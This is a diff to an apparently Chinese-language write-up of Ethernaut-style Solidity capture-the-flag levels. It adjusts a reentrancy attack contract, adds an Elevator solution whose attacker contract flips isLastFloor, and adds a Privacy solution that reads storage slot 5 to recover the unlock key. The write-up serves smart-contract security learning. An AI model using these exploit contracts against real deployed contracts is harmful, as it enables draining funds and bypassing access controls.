@@ -505,7 +505,7 @@ contract Attack {
     receive() external payable {
         if (address(victimContract).balance >= 0.001 ether) {
             victimContract.withdraw(0.001 ether);
-        } else {
+        } else if (address(victimContract).balance > 0 ether){ // 这里后面修改了一下，就不会出 out of gas 的问题，但 out of gas 也会攻击成功
             victimContract.withdraw(address(victimContract).balance);
         }
     }
@@ -520,4 +520,115 @@ contract Attack {
     }
 }
 ```
-attack 的时候传 0.001 ether 即可
+attack 的时候传 0.001 ether 即可。
+
+# Elevator
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface Building {
+    function isLastFloor(uint256) external returns (bool);
+}
+
+contract Elevator {
+    bool public top;
+    uint256 public floor;
+
+    function goTo(uint256 _floor) public {
+        Building building = Building(msg.sender);
+
+        if (!building.isLastFloor(_floor)) {
+            floor = _floor;
+            top = building.isLastFloor(floor);
+        }
+    }
+}
+```
+目标让 top 变成 true。下面这一段代码看起来是无法满足的，但 building 合约是自己控制的，可以在里面反转 isLastFloor 的返回值，先返回 false 然后返回 true。
+```solidity
+if (!building.isLastFloor(_floor)) {
+    floor = _floor;
+    top = building.isLastFloor(floor);
+}
+```
+
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+interface IElevator {
+    function goTo(uint _floor) external;    
+}
+
+contract Attack {
+    IElevator public victimContract = IElevator(0xB85c9b8D0499B6D143675FF579755d2dEEaccDEa);
+    bool public toggle = true;
+
+    constructor(){}
+    
+    function isLastFloor(uint256) public returns (bool){
+        toggle = !toggle;
+        return toggle;
+    }
+
+    function attack() public payable {
+        victimContract.goTo(1);
+    }
+}
+```
+
+这个题 goTo 传多少都没意义，关键是控制 isLastFloor 返回符合目标合约的约束。
+
+# Privacy
+```solidity
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.0;
+
+contract Privacy {
+    bool public locked = true;
+    uint256 public ID = block.timestamp;
+    uint8 private flattening = 10;
+    uint8 private denomination = 255;
+    uint16 private awkwardness = uint16(block.timestamp);
+    bytes32[3] private data;
+
+    constructor(bytes32[3] memory _data) {
+        data = _data;
+    }
+
+    function unlock(bytes16 _key) public {
+        require(_key == bytes16(data[2]));
+        locked = false;
+    }
+
+    /*
+    A bunch of super advanced solidity algorithms...
+
+      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`
+      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,
+      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\
+      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)
+      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU
+    */
+}
+```
+目标是解锁这个合约。要解锁合约，我们需要找到一个 bytes16 的 _key，该密钥必须与 data[2] 的前 16 字节相同。也就是说，合约的解锁机制依赖于 data[2] 的内容。
+- 在 Solidity 中，状态变量是按顺序存储在合约的存储槽（slots）中的。每个存储槽的大小为 32 字节（256 位）。我们可以利用这一点通过读取合约的存储来获取 data[2] 的内容。以下是 Solidity 中变量的存储规则：
+    - 每个 uint256 或 bytes32 类型的变量独占一个存储槽。
+    - 较小的数据类型（如 uint8 和 uint16）可以合并存储在同一个槽中，直到占满 32 字节。
+- 存储布局分析：根据代码，变量的存储分布如下
+    - locked（bool 类型）占用第 0 槽的第 1 位。
+    - ID（uint256 类型）占用第 1 槽。
+    - flattening, denomination, 和 awkwardness（uint8 和 uint16 类型）会合并到第 2 槽。
+    - data[0], data[1], 和 data[2] 分别占用第 3、4、5 槽。
+    - 我们需要的是 data[2]，它位于存储槽 5 中。
+
+```js
+await web3.eth.getStorageAt("0xCe702b10A17D441216cdA807c7b93E6d787479c6", 5);
+await contract.unlock("0x9a7cc95f3d89c118afdf08eba0a9246c")
+await contract.locked()
+```
+
+
